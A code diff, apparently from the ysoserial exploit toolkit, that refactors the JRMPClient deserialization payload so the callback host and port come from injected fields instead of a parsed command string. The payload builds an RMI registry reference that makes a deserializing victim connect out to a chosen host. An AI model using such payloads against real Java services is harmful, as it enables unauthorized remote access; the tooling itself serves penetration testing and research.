@@ -10,6 +10,8 @@ import java.util.Random;
 import sun.rmi.server.UnicastRef;
 import sun.rmi.transport.LiveRef;
 import sun.rmi.transport.tcp.TCPEndpoint;
+import ysoserial.annotation.Bind;
+import ysoserial.interfaces.ObjectPayload;
 import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.PayloadRunner;
 
@@ -50,20 +52,19 @@ import ysoserial.payloads.util.PayloadRunner;
 } )
 @PayloadTest( harness = "ysoserial.payloads.JRMPReverseConnectSMTest")
 public class JRMPClient extends PayloadRunner implements ObjectPayload<Registry> {
+	
+	@Bind private String host;
+	@Bind private int port;
 
-    public Registry getObject ( final String command ) throws Exception {
+    /**
+	 * @deprecated Use {@link #getObject()} instead
+	 */
+	public Registry getObject ( final String command ) throws Exception {
+		return getObject();
+	}
 
-        String host;
-        int port;
-        int sep = command.indexOf(':');
-        if ( sep < 0 ) {
-            port = new Random().nextInt(65535);
-            host = command;
-        }
-        else {
-            host = command.substring(0, sep);
-            port = Integer.valueOf(command.substring(sep + 1));
-        }
+
+	public Registry getObject ( ) throws Exception {
         ObjID id = new ObjID(0); // RMI registry
         TCPEndpoint te = new TCPEndpoint(host, port);
         UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
